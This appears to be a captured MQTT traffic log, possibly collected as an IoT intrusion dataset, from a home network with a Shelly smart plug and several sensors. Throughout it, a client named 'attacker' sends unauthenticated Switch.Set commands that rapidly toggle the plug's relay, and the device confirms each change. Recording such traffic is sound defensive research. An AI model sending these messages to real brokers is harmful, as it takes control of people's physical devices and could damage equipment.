2026-04-22T16:39:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5294 34473.060 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34473.06,""swi"
2026-04-22T16:39:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5295 34473.079 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5296 34473.558 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:00,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34473.56,""swi"
2026-04-22T16:39:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5297 34473.575 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5298 34474.059 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34474.06,""swi"
2026-04-22T16:39:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5299 34474.077 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5300 34474.559 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34474.56,""swi"
2026-04-22T16:39:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5301 34474.575 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5302 34475.060 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34475.06,""swi"
2026-04-22T16:39:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5303 34475.078 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5304 34475.561 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34475.56,""swi"
2026-04-22T16:39:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5305 34475.577 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5306 34476.062 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34476.06,""swi"
2026-04-22T16:39:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5307 34476.081 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5308 34476.562 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34476.56,""swi"
2026-04-22T16:39:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5309 34476.579 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5310 34477.063 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34477.06,""swi"
2026-04-22T16:39:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5311 34477.081 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5312 34477.567 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34477.56,""swi"
2026-04-22T16:39:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5313 34477.584 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5314 34478.064 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34478.06,""swi"
2026-04-22T16:39:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5315 34478.082 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5316 34478.565 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34478.56,""swi"
2026-04-22T16:39:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5317 34478.582 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5318 34479.065 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34479.06,""swi"
2026-04-22T16:39:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5319 34479.084 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5320 34479.567 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34479.56,""swi"
2026-04-22T16:39:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5321 34479.583 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:39:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:39:06,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:39:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:39:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:39:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5322 34480.067 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34480.06,""swi"
2026-04-22T16:39:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5323 34480.085 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5324 34480.567 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34480.56,""swi"
2026-04-22T16:39:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5325 34480.584 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5326 34481.068 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34481.07,""swi"
2026-04-22T16:39:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5327 34481.087 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5328 34481.569 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34481.57,""swi"
2026-04-22T16:39:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5329 34481.585 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5330 34482.072 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34482.07,""swi"
2026-04-22T16:39:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5331 34482.091 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5332 34482.571 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34482.57,""swi"
2026-04-22T16:39:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5333 34482.587 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5334 34483.071 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34483.07,""swi"
2026-04-22T16:39:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5335 34483.090 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5336 34483.572 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34483.57,""swi"
2026-04-22T16:39:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5337 34483.588 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5338 34484.073 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34484.07,""swi"
2026-04-22T16:39:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5339 34484.091 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5340 34484.574 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34484.57,""swi"
2026-04-22T16:39:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5341 34484.590 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5342 34485.075 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34485.07,""swi"
2026-04-22T16:39:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5343 34485.094 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5344 34485.575 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34485.57,""swi"
2026-04-22T16:39:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5345 34485.591 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:13,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:13,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
